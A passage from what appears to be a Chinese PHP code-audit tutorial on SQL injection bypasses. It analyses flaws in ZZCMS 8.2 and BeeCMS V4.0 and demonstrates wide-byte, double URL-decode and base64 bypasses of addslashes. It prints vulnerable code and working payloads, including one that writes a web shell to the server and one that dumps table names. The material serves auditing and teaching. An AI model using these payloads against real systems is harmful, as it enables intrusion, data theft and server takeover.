ZZCMS V8.2\u7248\u672C\u4E2D\u51FA\u73B0\u8FC7HTTP\u5934\u4E2D\u53C2\u6570\u503C\u65E0\u8FC7\u6EE4\u5BFC\u81F4\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u5728\\zzcms\\zzcms8.2\\user\\check.php\u6587\u4EF6\u4E2D\u6267\u884CSQL\u8BED\u53E5\u7684\u65F6\u5019\uFF0C\u5176\u4F7F\u7528\u4E86getip\u51FD\u6570\u83B7\u53D6\u767B\u5F55IP\u7136\u540E\u62FC\u63A5\u5230SQL\u4E2D\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
**$ip=getip();      //\u8C03\u7528getip\u51FD\u6570\u83B7\u53D6ip\u5730\u5740\u8D4B\u503C\u7ED9$ip\u53D8\u91CF**\r
\r
define('trytimes',50); //\u53EF\u5C1D\u8BD5\u767B\u5F55\u6B21\u6570\r
\r
define('jgsj',15*60); //\u95F4\u9694\u65F6\u95F4\uFF0C\u79D2\r
\r
**$sql="select \\* from zzcms_login_times where ip='$ip' and count>='".trytimes."' and unix_timestamp()-unix_timestamp(sendtime)<".jgsj." ";**\r
\r
$rs = query($sql);   //\u67E5\u8BE2\u663E\u793A\u5185\u5BB9\r
\r
$row= num_rows($rs);\r
\r
if ($row){\r
\r
$jgsj=jgsj/60;\r
\r
showmsg("\u5BC6\u7801\u9519\u8BEF\u6B21\u6570\u8FC7\u591A\uFF0C\u8BF7\u4E8E".$jgsj."\u5206\u949F\u540E\u518D\u8BD5\uFF01");\r
\r
}\r
\r
\r
\r
\u4F46\u662F\u5728\\zzcms\\zzcms8.2\\inc\\function.php\u6587\u4EF6\u7684getip\u65B9\u6CD5\u7684\u4EE3\u7801\u4E2D\uFF0C\u8BE5\u65B9\u6CD5\u6D41\u7A0B\uFF1A\r
\r
l \u901A\u8FC7getenv()\u83B7\u53D6\u6307\u5B9AHTTP\u5934\u4FE1\u606F\uFF0C\u901A\u8FC7strcasecmp()\u6765\u8FDB\u884C\u5B57\u7B26\u4E32\u6BD4\u8F83\u3002\r
\r
l \u5982\u679C\u6307\u5B9AHTTP\u5934\u7684\u957F\u5EA6\u6BD4\u5B57\u7B26\u4E32unknown\u5927\uFF0C\u5C31\u8FD4\u56DE\u5927\u4E8E0\u7684\u503C\uFF0C\u7136\u540E\u76F4\u63A5\u8D4B\u503C\u7ED9\u53D8\u91CFip\u3002\uFF08\u7B80\u800C\u8A00\u4E4B\uFF0C\u5C31\u662F\u6CA1\u6709\u4EFB\u4F55\u8FC7\u6EE4\uFF09\u3002\r
\r
l \u76F4\u63A5\u5E26\u5165\u53D8\u91CFip\u5E76\u8FD4\u56DE\u5E76\u6CA1\u6709\u5BF9\u4F20\u5165\u7684IP\u8FDB\u884C\u5408\u89C4\u5224\u65AD\uFF0C\u53C8\u5C06\u65B9\u6CD5\u7684\u7ED3\u679C\u8FD4\u56DE\u5230\u8C03\u7528\u7684\u4F4D\u7F6E\uFF0C\u6240\u4EE5\u6B64\u5904\u5B58\u5728SQL\u6CE8\u5165\uFF0C\u7ECF\u8FC7\u5206\u6790\u53D1\u73B0\u6709\u591A\u5904\u4F7F\u7528\u4E86getip\u65B9\u6CD5\u4E0E\u6570\u636E\u8FDB\u884C\u62FC\u63A5\uFF0C\u6240\u4EE5\u8FD8\u6709\u8BB8\u591A\u6F0F\u6D1E\u7B49\u5F85\u6316\u6398\u3002\r
\r
\r
\r
function **getip()**{                    //getip\u51FD\u6570\u5B9A\u4E49\r
\r
if (**getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")**)\r
\r
**$ip = getenv("HTTP_CLIENT_IP");** \r
\r
else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) \r
\r
$ip = getenv("HTTP_X_FORWARDED_FOR"); \r
\r
else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) \r
\r
$ip = getenv("REMOTE_ADDR"); \r
\r
else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) \r
\r
$ip = $_SERVER['REMOTE_ADDR']; \r
\r
else \r
\r
$ip = "unknown"; \r
\r
**return($ip);**\r
\r
}\r
\r
\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\r
\r
\u4F7F\u7528BurpSuite\u62E6\u622A\u6B63\u5E38\u7F51\u7AD9\u7684\u8BF7\u6C42\uFF0C\u5176\u6CE8\u5165\u70B9\u53EF\u4EE5\u6709\u591A\u4E2A\uFF0C\u5305\u62EC\uFF1AHTTP_CLIENT_IP**\u3001**HTTP_X_FORWARDED_FOR\u3001REMOTE_ADDR\u3002\u5F53\u8BBE\u7F6EHTTP\u5934\u4E2DX_FORWARDED_FOR\u7684\u503C\u4E3A\u201C192.168.2.108\u2019 and 1=2#\u201D\u65F6\u5C06\u6210\u529F\u6CE8\u5165SQL\uFF0C\u6570\u636E\u5E93\u76D1\u63A7\u6548\u679C\u5982\u56FE3-3\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image176.jpg)\r
\r
\u56FE3-3 SQL\u6267\u884C\u76D1\u63A7\u56FE\r
\r
### 3.2.3  \u5B57\u7B26\u4E32\u66FF\u6362\u7ED5\u8FC7\u6CE8\u5165\r
\r
\u672C\u8282\u4ECB\u7ECDSQL\u6CE8\u5165\u4E2D\u5BF9\u4E8E\u5173\u952E\u5B57\u8FDB\u884C\u8FC7\u6EE4\u7684\u7ED5\u8FC7\u65B9\u6CD5\u3002\u5728\u5F88\u591ACMS\u4E2D\u4E3A\u4E86\u9632\u5FA1SQL\u6CE8\u5165\u90FD\u4F1A\u4E3A\u4F20\u9012\u53C2\u6570\u8BBE\u7F6E\u81EA\u5B9A\u4E49\u8FC7\u6EE4\u51FD\u6570\uFF0C\u4ECE\u800C\u5BF9\u654F\u611F\u5B57\u7B26\u8FDB\u884C\u66FF\u6362\u3002\u8FD9\u65F6\u53EF\u4EE5\u9488\u5BF9\u5176\u6B63\u5219\u8868\u8FBE\u5F0F\u8FDB\u884C\u5206\u6790\uFF0C\u4ECE\u800C\u7ED5\u8FC7\u8FC7\u6EE4\u51FD\u6570\u5B8C\u6210SQL\u6CE8\u5165\u3002\u5E38\u89C1\u7ED5\u8FC7\u65B9\u6CD5\u901A\u5E38\u6709\uFF1A\u53CC\u5199\u3001\u5927\u5C0F\u5199\u3001\u7F16\u89E3\u7801\u7B49\u3002\r
\r
\uFF081\uFF09\u6848\u4F8B\u5206\u6790\r
\r
BeeCMS V4.0_R\u7248\u672C\u4E2D\u51FA\u73B0\u8FC7\u53EF\u4EE5\u7ED5\u8FC7\u5168\u5C40\u9632\u62A4\u51FD\u6570\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u5176\u4E3B\u8981\u539F\u56E0\u5C31\u65F6\u5168\u5C40\u8FC7\u6EE4\u51FD\u6570\u4E0D\u4E25\u683C\u5BFC\u81F4\u7684\u3002\u8BE5\u7F51\u7AD9\u7684\u767B\u9646\u529F\u80FD\\admin\\login.php\u6587\u4EF6\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
//\u5224\u65AD\u767B\u5F55\r
\r
elseif($action=='ck_login'){\r
\r
\u200B    global $submit,$user,$password,$_sys,$code;\r
\r
\u200B    $submit=$_POST['submit'];\r
\r
\u200B     **$user=fl_html(fl_value($_POST['user']));**\r
\r
\u200B     **$password=fl_html(fl_value($_POST['password']));**\r
\r
\u200B    $code=$_POST['code'];\r
\r
\u200B    if(!isset($submit)){\r
\r
\u200B        msg('\u8BF7\u4ECE\u767B\u9646\u9875\u9762\u8FDB\u5165');}\r
\r
\u200B    if(empty($user)||empty($password)){\r
\r
\u200B        msg("\u5BC6\u7801\u6216\u7528\u6237\u540D\u4E0D\u80FD\u4E3A\u7A7A");}\r
\r
\u200B    if(!empty($_sys['safe_open'])){\r
\r
\u200B        foreach($_sys['safe_open'] as $k=>$v){\r
\r
\u200B        if($v=='3'){\r
\r
\u200B            if($code!=$s_code){msg("\u9A8C\u8BC1\u7801\u4E0D\u6B63\u786E\uFF01");}}}}\r
\r
\u200B    check_login($user,$password);\r
\r
}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u7684\u4E3B\u8981\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u83B7\u53D6\u53C2\u6570submit\u3001user\u3001password\u3001code\uFF1B\r
\r
l \u5BF9\u53D8\u91CFuser\u3001password\u4F7F\u7528fl_value\u51FD\u6570\u548Cfl_html\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF1B\r
\r
l \u5224\u65AD\u7528\u6237\u540D\u5BC6\u7801\u4E0D\u80FD\u4E3A\u7A7A\uFF0C\u4E14\u9A8C\u8BC1\u7801\u6B63\u786E\uFF1B\r
\r
l \u8C03\u7528check_login\u51FD\u6570\u8FDB\u884C\u767B\u5F55\u9A8C\u8BC1\u3002\r
\r
\u56E0\u6B64\uFF0C\u9700\u8981\u5BF9fl_value\u51FD\u6570\u3001fl_html\u51FD\u6570\u3001check_login\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
// **fl_value****\u51FD\u6570\u4EE3\u7801**\r
\r
function **fl_value**($str){\r
\r
\u200B    if(empty($str)){return;}\r
\r
\u200B    **return preg_replace('/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\/\\*|\\*|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file|outfile/i','',$str);//****\u5C06\u5173\u952E\u5B57\u6216\u6B63\u5219\u8868\u8FBE\u5F0F\u7B26\u5408\u7684\u5B57\u7B26\u4E32\u66FF\u6362\u4E3A\u7A7A**\r
\r
**}**\r
\r
// **fl_html****\u51FD\u6570\u4EE3\u7801**\r
\r
function **fl_html**($str){\r
\r
\u200B    return htmlspecialchars($str);//\u5BF9\u5B57\u7B26\u4E32\u8FDB\u884CHTML\u8F6C\u7801\r
\r
}\r
\r
**//check_login\u51FD\u6570\u4EE3\u7801**\r
\r
function **check_login**($user,$password){\r
\r
\u200B    $rel=$GLOBALS['mysql']->fetch_asc("**select id,admin_name,admin_password,admin_purview,is_disable from ".DB_PRE."admin where admin_name='".$user."' limit 0,1**"); \r
\r
\u200B    $rel=empty($rel)?'':$rel[0];\r
\r
\u200B    if(empty($rel)){\r
\r
\u200B        msg('\u4E0D\u5B58\u5728\u8BE5\u7BA1\u7406\u7528\u6237','login.php');\r
\r
\u200B    }\u2026\u7701\u7565\u2026\r
\r
\r
\r
\u901A\u8FC7\u5BF9\u4E0A\u8FF0\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u53EF\u4EE5\u5F97\u51FA\u4EE5\u4E0B\u7ED3\u8BBA\uFF1A\r
\r
l fl_value\u51FD\u6570\u3001fl_html\u51FD\u6570\u53EF\u4EE5\u901A\u8FC7\u53CC\u5199\u7ED5\u8FC7\u9632\u5FA1\u51FD\u6570\u3002\r
\r
l check_login\u51FD\u6570\u4E2D\u5C06\u7528\u6237\u540D\u548C\u5BC6\u7801\u53C2\u6570\u76F4\u63A5\u62FC\u63A5\u4E3ASQL\u8BED\u53E5\u6267\u884C\u3002\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\r
\r
fl_value\u51FD\u6570\u53EF\u4EE5\u4F7F\u7528\u53CC\u5199\u654F\u611F\u5B57\u7B26\u4E32\u7684\u65B9\u5F0F\u7ED5\u8FC7\uFF0C\u4F8B\u5982\uFF1A\u5BF9\u4E8Eselect\u5173\u952E\u5B57\u53EF\u4F7F\u7528\u201Cselselectect\u201D\u3001\u5BF9\u4E8Eunion\u5173\u952E\u5B57\u53EF\u4EE5\u4F7F\u7528\u201Cuni union on\u201D\u7B49\u3002\u4E0B\u9762\u7ED9\u51FA\u5411\u670D\u52A1\u5668\u5199\u5165\u6728\u9A6C\u7684Payload\uFF0C\u5982\u4E0B\uFF1A\r
\r
\r
\r
user=admin' **uni union on** **selselectect** 1,2,3,4,5 '' in into **outoutfilefile** 'D: /phpStudy/PHPTutorial/WWW/beecms/a.php' --%20\r
\r
\r
\r
## 3.3 SQL\u6CE8\u5165\u7ED5\u8FC7addslashes\r
\r
### 3.3.1  \u5BBD\u5B57\u8282\u6CE8\u5165\u7ED5\u8FC7\r
\r
\u4E3A\u4E86\u9632\u5FA1SQL\u6CE8\u5165\u653B\u51FB\uFF0C\u7A0B\u5E8F\u4E00\u822C\u5C06\u7528\u6237\u8F93\u5165\u6570\u636E\u7528addslashes\u7B49\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\u3002addslashes\u51FD\u6570\u5728\u9884\u5B9A\u4E49\u5B57\u7B26\u4E4B\u524D\u6DFB\u52A0\u53CD\u659C\u6760\\\uFF08\u9884\u5B9A\u4E49\u5B57\u7B26\u5305\u62EC\uFF1A\u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3001\u53CD\u659C\u6760\u3001NULL\uFF09\u3002\u4F46\u8BE5\u51FD\u6570\u867D\u7136\u4F1A\u6DFB\u52A0\u53CD\u659C\u6760\\\u8FDB\u884C\u8F6C\u4E49\uFF0C\u4F46\u662F\\\u5E76\u4E0D\u4F1A\u63D2\u5165\u5230\u6570\u636E\u5E93\u4E2D\u3002\u6CE8\u610F\uFF1Aaddslashes\u51FD\u6570\u7684\u529F\u80FD\u548C\u9B54\u672F\u5F15\u53F7\u5B8C\u5168\u76F8\u540C\uFF0C\u53EF\u4EE5\u4F7F\u7528get_magic_quotes_gpc()\u51FD\u6570\u68C0\u6D4B\u662F\u5426\u5F00\u542F\u9B54\u672F\u5F15\u53F7\u3002\r
\r
\u5BBD\u5B57\u8282\u6CE8\u5165\u53EF\u4EE5\u5728\u7F16\u7801\u8BBE\u7F6E\u4E0D\u5408\u7406\u7684\u60C5\u51B5\u4E0B\u7ED5\u8FC7\u9632\u5FA1\u51FD\u6570addslashes\u3002\u8BE5\u6F0F\u6D1E\u4EA7\u751F\u7684\u4E3B\u8981\u539F\u56E0\u662FMySQL\u4F7F\u7528GBK\u7F16\u7801\u65F6\uFF0C\u5982\u679C\u7B2C\u4E00\u4E2A\u5B57\u7B26ASCII\u7F16\u7801\u5927\u4E8E128\uFF0CMySQL\u5219\u4F1A\u8BA4\u4E3A\u524D\u4E24\u4E2A\u5B57\u7B26\u662F\u4E00\u4E2A\u6C49\u5B57\uFF0C\u4F1A\u5C06\u540E\u9762\u7684\u8F6C\u79FB\u5B57\u7B26\\\u201C\u5403\u6389\u201D\uFF0C\u5E76\u5C06\u524D\u4E24\u4E2A\u5B57\u7B26\u62FC\u63A5\u4E3A\u6C49\u5B57\uFF0C\u8FD9\u6837\u5C31\u53EF\u4EE5\u5C06SQL\u8BED\u53E5\u95ED\u5408\u5E76\u9020\u6210\u5BBD\u5B57\u8282\u6CE8\u5165\u3002\r
\r
\u4F8B\u5982\uFF1A\u8F93\u5165\u7684\u8BF7\u6C42\u8DEF\u5F84\u4E3Ahttp://192.168.0.10/?id=1%81\u2019\u3002\u5176\u4E2D\u53C2\u6570\u4E3Aid=1%81\u2019\uFF0C\u7ECF\u8FC7addslashes\u8FC7\u6EE4\u540E\u5355\u5F15\u53F7\u88AB\u8F6C\u4E49\uFF0C\u5176\u53C2\u6570\u53D8\u4E3Aid=1%81\\\u2019\u3002\u7531\u4E8E%81\u662FURL\u7F16\u7801\u5668\u5BF9\u5E94\u7684ASCII\u7F16\u7801\u5927\u4E8E128\uFF0C\u4E14\u82E5MYSQL\u4F7F\u7528GBK\u7F16\u7801\uFF0C\u5219\u5C06\u201C%81\\\u201D\u5F53\u505A\u4E00\u4E2A\u4E2D\u6587\u6C49\u5B57\u201C\u4E57\u201D\uFF0C\u88AB\u89E3\u6790\u540E\u7ED3\u679C\u4E3A\u201C1\u4E57\u201D\u4ECE\u800C\u5C06\u8F6C\u79FB\u5B57\u7B26\u8986\u76D6\u6389\u6210\u529F\u7ED5\u8FC7\u8FC7\u6EE4\u51FD\u6570addslashes\u3002\r
\r
\u5BBD\u5B57\u8282\u6CE8\u5165\u4E2D\u5E38\u7528\u7684ASCII\u5927\u4E8E128\u7684URL\u7F16\u7801\u6709%81\u3001%df\u7B49\u3002PHP\u4EE3\u7801\u8FDE\u63A5\u6570\u636E\u5E93\u65F6\u5F88\u591A\u914D\u7F6E\u6587\u4EF6\u4F1A\u4F7F\u7528\u201Cset character_set_client=gbk\u201D\u8BBE\u7F6E\u6570\u636E\u7F16\u7801\u4E3AGBK\u3002\u9664\u4E0A\u8FF0\u5173\u952E\u5B57\u5916\uFF0C\u5176\u4ED6\u5BBD\u5B57\u8282\u6F0F\u6D1E\u6316\u6398\u65F6\u9700\u6CE8\u610F\u7684\u5173\u952E\u5B57\u8FD8\u5305\u62EC\uFF1ASET NAME\u3001mysql_set_charset('gbk')\u3002\r
\r
\uFF081\uFF09\u4E0B\u9762\u7ED9\u51FA\u5BBD\u5B57\u8282\u6CE8\u5165\u7684\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
//\u8FDE\u63A5\u6570\u636E\u5E93\u90E8\u5206\uFF0C\u6CE8\u610F\u4F7F\u7528\u4E86gbk\u7F16\u7801\r
\r
$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');//\u8FDE\u63A5\u6570\u636E\u5E93\r
\r
mysql_query("SET NAMES '**gbk**'");          //\u8BBE\u7F6EMySQL\u5B57\u7B26\u96C6\u4E3AGBK\u7F16\u7801\r
\r
mysql_select_db('test', $conn) OR emMsg("\u8FDE\u63A5\u6570\u636E\u5E93\u5931\u8D25\uFF0C\u672A\u627E\u5230\u60A8\u586B\u5199\u7684\u6570\u636E\u5E93");\r
\r
$id = isset($_GET['id']) ? **addslashes**($_GET['id']) : 1;\r
\r
$sql = "SELECT * FROM news WHERE tid='{$id}'";\r
\r
$result = mysql_query($sql, $conn) or die(mysql_error());  //\u6267\u884Csql\u8BED\u53E5\r
\r
?>\r
\r
\r
\r
\uFF082\uFF09\u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4F7F\u7528\u201Cmysql_query("SET NAMES '**gbk**'");\u201D\u8BBE\u7F6E\u4E86MySQL\u670D\u52A1\u5668\u6570\u636E\u7F16\u7801\u4E3AGBK\uFF0C\u540C\u65F6\u901A\u8FC7GET\u65B9\u5F0F\u4F20\u9012\u7684\u53C2\u6570id\u88ABaddslashes\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\u4FDD\u62A4\uFF0C\u5B58\u5728\u5BBD\u5B57\u8282\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\uFF083\uFF09\u5229\u7528\u65B9\u6CD5\uFF1A\r
\r
\u6D4B\u8BD5\u5BBD\u5B57\u8282\u6F0F\u6D1E\uFF1Ahttp://192.168.0.10/sqli-labs-master/0x01/?id=-1%81\u2019\u3002\u82E5\u8BE5\u9875\u9762\u663E\u793A\u5982\u56FE3-4\u6240\u793A\uFF0C\u5219\u5B58\u5728\u5BBD\u5B57\u8282\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image178.jpg)\r
\r
\u56FE3-4 \u5BBD\u5B57\u8282\u62A5\u9519\u56FE\r
\r
\u83B7\u53D6\u6570\u636E\u5E93\u540D\u79F0\uFF1Ahttp://192.168.0.10/?id=-1%81%27union%20select%201,group_concat(table_name),3%20from%20inFORMation_schema.tables%20where%20table_schema=0x74657374%23\u3002\u8BF7\u6C42\u540E\u67E5\u770B\u7528\u6237\u53CA\u6570\u636E\u5E93\u4FE1\u606F\u5982\u56FE3-5\u6240\u793A\uFF0C\u6570\u636E\u5E93test\u4E0B\u5B58\u5728\u8868admin\u548Cnews\u3002\r
\r
\u6CE8\u610F\uFF1A0x74657374\u662F\u6570\u636E\u5E93\u540D\u79F0test\u768416\u8FDB\u5236\u8F6C\u6362\u540E\u7ED3\u679C\uFF0C\u8FD9\u79CD\u5199\u6CD5\u4E3B\u8981\u662F\u56E0\u4E3A\u5982\u679C\u8F93\u5165table_schema=\u2019test\u2019\u5219\u5176\u4E2D\u5355\u5F15\u53F7\u4F1A\u88ABaddslashes\u8F6C\u4E49\u5BFC\u81F4\u8BED\u6CD5\u9519\u8BEF\u3002\u53EA\u6709\u5C06test\u8F6C\u6362\u4E3A16\u8FDB\u5236\u624D\u80FD\u591F\u6267\u884C\uFF0CMySQL\u53EF\u4EE5\u6B63\u5E38\u5904\u740616\u8FDB\u5236\u5B57\u7B26\u4E32\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image180.jpg)\r
\r
\u56FE3-5 \u5BBD\u5B57\u8282\u5229\u7528\u56FE\r
\r
### 3.3.2  \u89E3\u7801\u6CE8\u5165\u7ED5\u8FC7\r
\r
\u89E3\u7801\u6CE8\u5165\u7ED5\u8FC7addslashes\u7684\u60C5\u51B5\uFF0C\u5305\u62EC\uFF1A\u4E8C\u6B21url\u7F16\u7801\u7ED5\u8FC7\u3001base64\u7F16\u7801\u7ED5\u8FC7\u3001Json\u7F16\u7801\u7ED5\u8FC7\u7B49\u3002\u5176\u539F\u7406\u662F\u5411\u7A0B\u5E8F\u53D1\u9001\u7F16\u7801\u540E\u7684\u53C2\u6570\u4ECE\u800C\u7ED5\u8FC7addslashes\u68C0\u6D4B\u673A\u5236\uFF0C\u540E\u53F0\u7A0B\u5E8F\u5BF9\u53C2\u6570\u89E3\u7801\u5E76\u62FC\u63A5SQL\u8BED\u53E5\u6267\u884C\u3002\r
\r
1\u3001\u4E8C\u6B21URL\u89E3\u7801\u7ED5\u8FC7\r
\r
\u5982\u679CWeb\u7A0B\u5E8F\u5BF9\u53C2\u6570\u4F7F\u7528urldecode\u6216rawurldecode\u51FD\u6570\u8FDB\u884CURL\u7F16\u7801\uFF0C\u5219\u53EF\u80FD\u5BFC\u81F4\u4E8C\u6B21\u89E3\u7801\u751F\u6210\u5355\u5F15\u53F7\u4ECE\u800C\u5F15\u8D77SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u4E8C\u6B21URL\u89E3\u7801\u6CE8\u5165\u53EF\u7ED5\u8FC7GPC\u4FDD\u62A4\u3001addslashes()\u3001mysql_real_escape_string()\u3001mysql_escape_string()\u51FD\u6570\u8FDB\u884C\u6CE8\u5165\u653B\u51FB\u3002\r
\r
\u4E8C\u6B21URL\u89E3\u7801\u6CE8\u5165\u539F\u7406\uFF1A\u5047\u8BBE\u63D0\u4EA4\u8BF7\u6C42\u8DEF\u5F84\u4E3A\u201C/1.php?id=1%2527\u201D\uFF0C\u670D\u52A1\u5668\u63A5\u6536\u5230\u8BE5\u8BF7\u6C42\u540E\u81EA\u52A8\u8FDB\u884C\u4E00\u6B21URL\u89E3\u7801\uFF0C\u89E3\u7801\u540E\u7ED3\u679C\u4E3A\u201C/1.php?id=1%27\u201D\uFF08%25\u7684URL\u89E3\u7801\u7ED3\u679C\u662F%\uFF09\u3002\u7136\u540E\uFF0C\u7A0B\u5E8F\u4E2D\u8C03\u7528urldecode\u51FD\u6570\u7B2C\u4E8C\u6B21\u5BF9\u8BF7\u6C42\u8FDB\u884CURL\u89E3\u7801\uFF0C\u89E3\u7801\u540E\u7ED3\u679C\u4E3A\u201C/1.php?id=1\u2019\u201D\uFF0C\u5355\u5F15\u53F7\u88AB\u6210\u529F\u89E3\u7801\u5E76\u62FC\u63A5SQL\u8BED\u53E5\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u5BBD\u5B57\u8282\u6CE8\u5165\u7684\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
$a=addslashes($_GET['p']);  //\u5BF9\u53C2\u6570p\u7684\u503C\u8FDB\u884Caddslashes\u8FC7\u6EE4\r
\r
$b=urldecode($a);      //\u5BF9\u53D8\u91CF$a\u8FDB\u884CURL\u89E3\u7801\r
\r
echo '$a='.$a;        //\u6253\u5370\u7B2C\u4E00\u6B21URL\u89E3\u7801\u503C\r
\r
echo '<br />';\r
\r
echo '$b='.$b;        //\u6253\u5370\u7B2C\u4E8C\u6B21URL\u89E3\u7801\u503C\r
\r
?>\r
\r
\r
\r
  \u53D1\u9001HTTP\u8BF7\u6C42\u4E3A\u201Chttp://192.168.0.10/2urlcode.php?p=1%2527\u201D\u8BF7\u6C42\u54CD\u5E94\u7ED3\u679C\u5206\u522B\u663E\u793A\u7B2C\u4E00\u6B21\u89E3\u7801\u7ED3\u679C$a=1%27\uFF0C\u7B2C\u4E8C\u6B21\u89E3\u7801\u7ED3\u679C\u4E3A$b=1\u2019\uFF0C\u5982\u56FE3-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image182.jpg)\r
\r
\u56FE3-6 \u4E8C\u6B21URL\u89E3\u7801\u5229\u7528\u56FE\r
\r
2\u3001Base64\u89E3\u7801\u7ED5\u8FC7\r
\r
Base64\u7F16\u7801\u7ED5\u8FC7\u4E0E\u4E8C\u6B21URL\u89E3\u7801\u7ED5\u8FC7\u539F\u7406\u7C7B\u4F3C\uFF0C\u7531\u4E8E\u7A0B\u5E8F\u4E2D\u5B58\u5728Base64\u89E3\u7801\u51FD\u6570\uFF0C\u56E0\u6B64\u5BF9\u8BF7\u6C42\u53C2\u6570\u5148\u8FDB\u884CBase64\u7F16\u7801\u540E\u518D\u4F20\u9012\u5904\u7406\uFF0C\u4ECE\u800C\u7ED5\u8FC7addslashes\u51FD\u6570\u8FC7\u6EE4\u3002\uFF08\u4F8B\u5982\uFF1Aadmin\u4F7F\u7528Base64\u7F16\u7801\u540E\u7ED3\u679C\u4E3AYWRtaW4nICM=\uFF09\u3002\r
\r
\uFF081\uFF09\u4EE5\u767B\u9646\u529F\u80FD\u4E3A\u6848\u4F8B\uFF0C\u7ED9\u51FABase64\u89E3\u7801\u7ED5\u8FC7\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
$link = mysql_connect('localhost', 'root', 'root') or die('bad!');\r
\r
mysql_query("SET NANES 'gbk'");\r
\r
mysql_select_db("test",$link);\r
\r
$username=$_REQUEST['username'];\r
\r
**$username=addslashes($username);      //\u4F7F\u7528addslashes\u51FD\u6570\u8FDB\u884C\u8F6C\u4E49**\r
\r
**$username=base64_decode($username);     //\u5BF9\u53C2\u6570username\u8FDB\u884CBase64\u89E3\u7801**\r
\r
$password=md5($_REQUEST ['password']);   //\u5BF9\u5BC6\u7801\u8FDB\u884Cmd5\u52A0\u5BC6\r
\r
**$sql="select count(\\*) as num from admin where name='".$username."' and pass='".$password.".";           //\u62FC\u63A5sql\u8BED\u53E5**\r
\r
$query=mysql_query($sql);\r
\r
$res=mysql_fetch_array($query);\r
\r
$count=$res['num'];\r
\r
if($count==1){echo "login success";}else{echo "login failed";}?>\r
\r
\r
\r
\uFF082\uFF09\u5229\u7528\u65B9\u6CD5\uFF1A\r
\r
\u9884\u62FC\u51D1\u7684SQL\u8BED\u53E5\u4E3A\u201Cselect count(*) as num from admin where name=\u2019admin\u2019# ' and pass='$password\u2019\u201D\u3002\u56E0\u6B64\uFF0C$username\u53C2\u6570\u503C\u4E3A\u201Cadmin\u2019#\u201D\uFF0C\u5BF9\u5176\u8FDB\u884CBase64\u7F16\u7801\u4E3A\u201CYWRtaW4nICM=\u201D\u3002\r
\r
\u53D1\u9001\u8BF7\u6C42\u4E3A\uFF1A\r
\r
 http://192.168.0.10 /index3.php?username=YWRtaW4nICM=&password=test\r
\r
\u8BF7\u6C42\u53D1\u9001\u81F3\u670D\u52A1\u5668\u7AEF\u540E\u201CYWRtaW4nICM=\u201D\u7ECF\u8FC7addslashes\u8FC7\u6EE4\u540E\u672A\u53D1\u751F\u53D8\u5316\uFF0CBase64\u89E3\u7801\u540E\u4E3Aadmin\u2019#\u3002\u8BE5\u53C2\u6570\u503C\u4F20\u9012\u81F3SQL\u8BED\u53E5\u6267\u884C\uFF0C\u663E\u793A\u201Clogin success\u201D\uFF0C\u5982\u56FE3-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image184.jpg)\r
\r
\u56FE3-7 Base64\u7F16\u7801\u7ED5\u8FC7\u56FE\r
\r
\u4F7F\u7528Seay\u5BA1\u8BA1\u5DE5\u5177\u76D1\u63A7\u6570\u636E\u5E93\u6267\u884C\u7ED3\u679C\u5982\u56FE3-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image186.jpg)\r
\r
\u56FE3-8 \u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u56FE\r
\r
### 3.3.3  \u5B57\u7B26\u4E32\u66FF\u6362\u7ED5\u8FC7\r
\r
\u5728\u6267\u884CSQL\u8BED\u53E5\u524D\uFF0C\u7A0B\u5E8F\u5BF9\u5B57\u7B26\u4E32\u7684\u67D0\u4E9B\u5B57\u7B26\u8FDB\u884C\u66FF\u6362\uFF0C\u66FF\u6362\u7684\u5B57\u7B26\u5305\u62EC\u53CD\u659C\u7EBF\uFF08\\\uFF09\u3001\u5355\u5F15\u53F7\uFF08\u2019\uFF09\uFF0C\u4ECE\u800C\u7ED5\u8FC7addslashes\u51FD\u6570\u3002\r
\r
